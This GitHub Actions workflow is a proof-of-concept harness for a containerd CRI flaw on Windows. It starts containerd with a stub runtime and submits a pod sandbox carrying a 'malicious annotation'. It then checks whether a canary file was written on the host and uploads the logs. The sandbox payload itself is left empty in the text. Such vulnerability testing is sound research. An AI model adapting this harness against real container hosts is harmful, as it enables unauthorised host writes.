name: D17 CRI RunPodSandbox annotation PoC
on:
  workflow_dispatch:
jobs:
  cri:
    runs-on: windows-latest
    timeout-minutes: 20
    steps:
      - name: Setup
        shell: pwsh
        run: |
          $ErrorActionPreference='Stop'
          $base='C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin","$base\stub","$base\cricanary","$base\crilogs" | Out-Null
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          $cfg=''; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
          $st=''; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'; Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
          New-Item -ItemType Directory -Force -Path "$base\cni\bin","$base\cni\conf" | Out-Null
          $cni='cGFja2FnZSBtYWluCgppbXBvcnQgImZtdCIKCmZ1bmMgbWFpbigpIHsKICAgIC8vIE1pbmltYWwgQ05JIEFERCByZXN1bHQgc28gY29udGFpbmVyZCdzIENOSSBzZXR1cCBzdWNjZWVkcyBpbiB0aGUgbGFiLgogICAgZm10LlByaW50KGB7ImNuaVZlcnNpb24iOiIxLjAuMCIsImlwcyI6W3siaXAiOiIxMC4yNDQuOTkuMi8yNCJ9XSwicm91dGVzIjpbXSwiZG5zIjp7fX1gKQp9Cg=='; [IO.File]::WriteAllBytes("$base\cni\src.go",[Convert]::FromBase64String($cni))
          Set-Content "$base\cni\go.mod" -Value "module cni`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'; Set-Location "$base\cni"; go build -o "$base\cni\bin\d17noop.exe" . 2>&1 | Out-Null
          New-Item -ItemType Directory -Force -Path 'C:\Program Files\containerd\cni\bin','C:\Program Files\containerd\cni\conf' | Out-Null
          Copy-Item "$base\cni\bin\d17noop.exe" 'C:\Program Files\containerd\cni\bin\' -Force
          $cc=@'
          {"cniVersion":"1.0.0","name":"d17net","plugins":[{"type":"d17noop"}]}
          '@
          $cc | Set-Content 'C:\Program Files\containerd\cni\conf\10-d17.conflist' -Encoding ascii
          Set-Content "$base\cni\conf\10-d17.conflist" -Value '{"cniVersion":"1.0.0","name":"d17net","plugins":[{"type":"d17noop"}]}' -Encoding ascii
          Invoke-WebRequest -Uri 'https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.32.0/crictl-v1.32.0-windows-amd64.tar.gz' -OutFile "$base\crictl.tgz" -UseBasicParsing
          tar xzf "$base\crictl.tgz" -C "$base"
          Get-Item "$base\crictl.exe" | Select-Object FullName,Length | Format-List

      - name: Run daemon + CRI PodSandbox with malicious annotation
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ctdpoc'
          $sb=''; [IO.File]::WriteAllBytes("$base\sandbox.json",[Convert]::FromBase64String($sb))
          $p=Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
          Write-Output "CONTAINERD_PID=$($p.Id)"
          Start-Sleep -Seconds 8
          $env:CONTAINERD_RUNTIME_ENDPOINT='npipe:////./pipe/ctd-grpc'
          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' info 2>&1 | Select-Object -First 20
          Write-Output '=== pull pause ==='
          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' pull registry.k8s.io/pause:3.10 2>&1 | Select-Object -Last 5
          Write-Output '=== runp ==='
          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' --timeout 120s runp --runtime runhcs-lcow "$base\sandbox.json" 2>&1 | Tee-Object -FilePath "$base\runp.out"
          Write-Output "RUNP_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 3
          Write-Output '=== CRI CANARY ==='
          Get-ChildItem "$base\cricanary" -Force | Select-Object Name,Length | Format-Table
          Write-Output "CRI_HOST_FILE_WRITTEN=$(Test-Path "$base\cricanary\scratch.vhdx")"
          Write-Output '=== daemon key lines ==='
          if (Test-Path "$base\stderr.log") { Select-String -Path "$base\stderr.log" -Pattern 'prepare snapshot|rootfs.location|scratch.vhdx not found|snapshotter error|RunPodSandbox' | Select-Object -Last 15 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-cri-evidence
          path: |
            C:\ctdpoc\runp.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\sandbox.json
          if-no-files-found: warn
